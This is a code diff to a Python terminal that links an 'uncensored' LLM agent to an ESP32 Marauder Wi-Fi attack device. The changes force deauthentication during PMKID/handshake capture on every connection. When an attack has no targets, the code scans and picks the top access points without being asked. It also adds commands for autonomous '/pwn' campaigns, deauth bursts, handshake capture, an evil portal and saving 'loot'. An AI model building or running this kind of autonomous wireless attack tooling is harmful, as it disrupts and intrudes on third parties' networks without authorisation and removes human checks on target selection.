@@ -45,9 +45,23 @@ import urllib.request
 # ---------------------------------------------------------------------------
 
 VENICE_BASE_URL = "https://api.venice.ai/api/v1"
-DEFAULT_MODEL   = "gemma-4-uncensored"
+# Qwen 3.6 Plus Uncensored — strong tool-calling, 1M context, uncensored.
+# Override with `export VENICE_MODEL=<slug>` or the /model REPL command.
+DEFAULT_MODEL   = "qwen-3-6-plus"
 BRIDGE_PORT     = int(os.getenv("MARAUDER_PORT", "7555"))
 PROMPT          = b"> "                  # Marauder end-of-response marker
+
+# Offensive settings enforced at connect so state is guaranteed every session,
+# regardless of stale persisted settings on the device (no reflash needed).
+# ForcePMKID drives the firmware's "DEAUTH TX" flag. SavePCAP is deliberately
+# DISABLED so capture streams over USB to us instead of the SD card.
+SETTINGS_ON_CONNECT = [
+    ("ForcePMKID", "enable"),    # → DEAUTH TX: TRUE (deauth during PMKID capture)
+    ("ForceProbe", "enable"),
+    ("EnableLED",  "enable"),
+    ("ChanHop",    "enable"),
+    ("SavePCAP",   "disable"),   # keep last; required for USB streaming
+]
 
 SCAN_COMMANDS: dict[str, str] = {
     "scanall":   "scanall",
@@ -73,6 +87,7 @@ _connected_host: str = ""
 _capture_buffer: str = ""
 _capture_meta: dict = {}
 _ROOT: "bool | None" = None   # memoized root-availability check
+_reconnecting: bool = False   # re-entry guard for _reconnect()
 
 # Well-known Android hotspot / tether gateway addresses. Because Termux, the
 # hotspot, and the Marauder Controller app all run on the SAME phone, the app's
@@ -282,8 +297,19 @@ def _read_until_prompt(timeout: float = 8.0) -> str:
 
 
 def _send_cmd(command: str, timeout: float = 8.0) -> str:
-    assert _sock is not None
-    _sock.sendall((command.strip() + "\n").encode())
+    data = (command.strip() + "\n").encode()
+    try:
+        if _sock is None:
+            raise OSError("not connected")
+        _sock.sendall(data)
+    except OSError:
+        if _reconnect() and _sock is not None:
+            try:
+                _sock.sendall(data)
+            except OSError:
+                return "ERROR: connection lost (write failed after reconnect)."
+        else:
+            return "ERROR: connection lost and reconnect failed."
     return _read_until_prompt(timeout)
 
 
@@ -321,6 +347,35 @@ def _fix_bt(raw: str) -> str:
     return re.sub(r"(?<!\n)(?=-?\d+ Device:)", "\n", raw).strip()
 
 
+def _enforce_settings() -> str:
+    """Push the offensive settings after connecting so DEAUTH TX and friends are
+    on every session. Returns a short status like 'DEAUTH TX: enabled'."""
+    for name, val in SETTINGS_ON_CONNECT:
+        _drain()
+        _send_cmd(f"settings -s {name} {val}", 3.0)
+    return "DEAUTH TX: enabled (ForcePMKID) · ForceProbe/EnableLED/ChanHop on · SavePCAP off (USB stream)"
+
+
+def _reconnect() -> bool:
+    """Drop the dead socket and reconnect once. Guarded against re-entry so the
+    _enforce_settings() calls made during reconnect don't recurse."""
+    global _sock, _reconnecting
+    if _reconnecting:
+        return False
+    _reconnecting = True
+    try:
+        try:
+            if _sock:
+                _sock.close()
+        except OSError:
+            pass
+        _sock = None
+        _connect_bridge()
+        return _sock is not None
+    finally:
+        _reconnecting = False
+
+
 def _connect_bridge() -> str:
     global _sock, _connected_host
 
@@ -337,12 +392,11 @@ def _connect_bridge() -> str:
         _connected_host = f"usb:{path}"
         time.sleep(0.3)
         _drain()
-        _sock.sendall(b"settings -s SavePCAP disable\n")
-        _read_until_prompt(4.0)
+        status = _enforce_settings()
         return (
             f"Connected to ESP32 directly over USB serial at {path} (115200 8N1)."
             + (" [root]" if _have_root() else "") + "\n"
-            "No Android bridge needed. SavePCAP disabled — output streams over USB."
+            f"No Android bridge needed. {status}"
         )
 
     # 2. TCP BRIDGE via the Android app (non-root path, or no serial driver).
@@ -359,11 +413,9 @@ def _connect_bridge() -> str:
         _connected_host = host
         time.sleep(0.5)
         _drain()
-        _sock.sendall(b"settings -s SavePCAP disable\n")
-        _read_until_prompt(4.0)
+        status = _enforce_settings()
         return (
-            f"Connected to ESP32 via Android bridge at {host}:{BRIDGE_PORT}.\n"
-            "SavePCAP disabled — all scan output streams through USB serial."
+            f"Connected to ESP32 via Android bridge at {host}:{BRIDGE_PORT}.\n{status}"
         )
 
     _sock = None
@@ -576,7 +628,11 @@ def dispatch(name: str, args: dict) -> str:
     global _sock, _connected_host, _capture_buffer, _capture_meta
 
     def need_sock() -> str | None:
-        return None if _sock else "ERROR: Not connected. Call connect first."
+        if _sock:
+            return None
+        # Auto-connect instead of erroring, so the agent never has to remember to.
+        res = _connect_bridge()
+        return None if _sock else res
 
     # ------------------------------------------------------------------ #
     if name == "device_connection":
@@ -867,7 +923,21 @@ def dispatch(name: str, args: dict) -> str:
             cmd += f" {options.strip()}"
         # Timed burst: run the attack for `duration`s, stream the result (deauth
         # acks, spam confirmations), then stop. duration=0 leaves it running.
-        return _attack_for(cmd, duration) or f"Attack '{attack_type}' started."
+        out = _attack_for(cmd, duration) or f"Attack '{attack_type}' started."
+        # Self-heal: attacks that need a selection fail with this message. Do a
+        # quick recon, select the top-ranked APs, and retry once automatically.
+        if "don't have any targets selected" in out.lower():
+            _sock.sendall(b"scanall\n")
+            _stream_for(6.0)
+            _send_cmd("stopscan -f", 6.0)
+            aps, _ = _ingest_scan(_send_cmd("list -a"), _send_cmd("list -c"))
+            if aps:
+                top = _rank_aps(aps)[:5]
+                idxs = ",".join(str(a["index"]) for a in top)
+                _send_cmd(f"select -a {idxs}", 4.0)
+                retry = _attack_for(cmd, duration)
+                return (f"[auto-selected top {len(top)} APs: idx {idxs}]\n{retry}")
+        return out
 
     elif name == "evil_portal":
         if err := need_sock(): return err
@@ -1580,6 +1650,112 @@ def run_agent(user_input: str, api_key: str, model: str) -> str:
             "and I'll pick up where I left off)")
 
 
+def _list_models(api_key: str) -> str:
+    """Query Venice's live /models endpoint so the user sees the real slugs their
+    account can use (which model names change over time). Highlights tool-capable ones."""
+    req = urllib.request.Request(
+        f"{VENICE_BASE_URL}/models",
+        headers={"Authorization": f"Bearer {api_key}"},
+    )
+    try:
+        ctx = ssl.create_default_context()
+        with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
+            data = json.loads(resp.read())
+    except Exception as exc:
+        return f"ERROR fetching models: {exc}"
+    rows = []
+    for m in data.get("data", []):
+        mid = m.get("id", "?")
+        spec = m.get("model_spec", {}) or {}
+        caps = spec.get("capabilities", {}) or {}
+        tools = caps.get("supportsFunctionCalling") or caps.get("optimizedForCode")
+        tag = "  [tools]" if caps.get("supportsFunctionCalling") else ""
+        if spec.get("modelType", m.get("type")) in (None, "text"):
+            rows.append(f"  {mid}{tag}")
+    if not rows:
+        return "No text models returned."
+    return "Available Venice models (use /model <id>):\n" + "\n".join(sorted(rows))
+
+
+HELP_TEXT = """\
+Marauder AI Terminal — commands:
+  <natural language>     Ask the AI agent (e.g. "scan and pwn the top 10").
+  /pwn [n]               Autonomous campaign against the top n APs (default 5).
+  /scan [secs]           Recon scan (default 20s).
+  /handshake [secs]      Forced PMKID/handshake capture (deauth + EAPOL, default 30s).
+  /deauth [secs]         Deauth (auto-selects top APs if needed, default 15s).
+  /targets               List discovered access points.
+  /intel                 Ranked targets + captured handshakes + campaign log.
+  /raw <command>         Send a raw Marauder serial command.
+  /save                  Save the loot buffer to ~/marauder_captures/.
+  /stop                  Stop any running attack/scan.
+  /status                Connection status.
+  /settings              Print device settings.
+  /connect               (Re)connect to the device.
+  /model [id]            Show or switch the AI model.
+  /models                List available Venice models (live).
+  /help                  This help.
+  quit                   Exit.
+Slash-commands run directly on the device — no AI in the loop, always work."""
+
+
+def _run_slash(line: str, api_key: str, state: dict) -> bool:
+    """Handle a /command deterministically (bypasses the LLM). Returns True if the
+    line was a slash-command (handled), False otherwise. Mutates state['model']."""
+    if not line.startswith("/"):
+        return False
+    parts = line[1:].split()
+    cmd = parts[0].lower() if parts else ""
+    arg = parts[1] if len(parts) > 1 else ""
+    rest = line[1:].split(None, 1)[1] if len(line[1:].split(None, 1)) > 1 else ""
+
+    def num(default):
+        try: return float(arg)
+        except (ValueError, TypeError): return default
+
+    if cmd in ("help", "h", "?"):
+        print(HELP_TEXT)
+    elif cmd == "model":
+        if arg:
+            state["model"] = arg
+            print(f"Model → {arg}")
+        else:
+            print(f"Current model: {state['model']}")
+    elif cmd == "models":
+        print(_list_models(api_key))
+    elif cmd == "connect":
+        print(dispatch("device_connection", {"action": "connect"}))
+    elif cmd == "status":
+        print(dispatch("device_connection", {"action": "status"}))
+    elif cmd == "settings":
+        print(dispatch("send_command", {"command": "settings", "timeout": 6}))
+    elif cmd == "pwn":
+        print(dispatch("auto_pwn", {"max_targets": int(num(5))}))
+    elif cmd == "scan":
+        print(dispatch("scan_and_capture", {"scan_type": "scanall", "duration": num(20)}))
+    elif cmd == "handshake":
+        print(dispatch("scan_and_capture",
+                       {"scan_type": "pmkid", "force": True, "duration": num(30)}))
+    elif cmd == "deauth":
+        print(dispatch("attack", {"attack_type": "deauth", "duration": num(15)}))
+    elif cmd == "targets":
+        print(dispatch("list_targets", {"target_type": "ap"}))
+    elif cmd == "intel":
+        print(dispatch("intel", {}))
+    elif cmd == "raw":
+        if not rest:
+            print("usage: /raw <marauder command>")
+        else:
+            print(dispatch("send_command", {"command": rest, "timeout": 8}))
+    elif cmd == "save":
+        print(dispatch("capture_data", {"action": "save"}))
+    elif cmd == "stop":
+        print(dispatch("wifi_control", {"action": "stop"}))
+    else:
+        print(f"Unknown command /{cmd} — type /help")
+    return True
+
+
 # ---------------------------------------------------------------------------
 # REPL
 # ---------------------------------------------------------------------------
@@ -1589,7 +1765,7 @@ def main() -> None:
     if not api_key:
         sys.exit("ERROR: VENICE_API_KEY environment variable is not set.")
 
-    model = os.environ.get("VENICE_MODEL", DEFAULT_MODEL)
+    state = {"model": os.environ.get("VENICE_MODEL", DEFAULT_MODEL)}
 
     devs = _serial_devices()
     if devs:
@@ -1599,9 +1775,10 @@ def main() -> None:
         host = override if override else f"auto ({', '.join(HOTSPOT_GATEWAYS[:3])}…)"
         link = f"TCP bridge {host}:{BRIDGE_PORT} (Marauder Controller app)"
     print("ESP32 Marauder AI Terminal (Termux — stdlib only)")
-    print(f"Model : {model} via Venice AI")
+    print(f"Model : {state['model']} via Venice AI")
     print(f"Link  : {link}")
-    print("Type 'quit' to exit.\n")
+    print("Slash-commands run directly (always work); plain text asks the AI.")
+    print("Type /help for commands, 'quit' to exit.\n")
 
     while True:
         try:
@@ -1616,7 +1793,9 @@ def main() -> None:
             break
 
         try:
-            result = run_agent(line, api_key, model)
+            if _run_slash(line, api_key, state):
+                continue
+            result = run_agent(line, api_key, state["model"])
             print(f"\n{result}")
         except KeyboardInterrupt:
             print("\n[cancelled]")
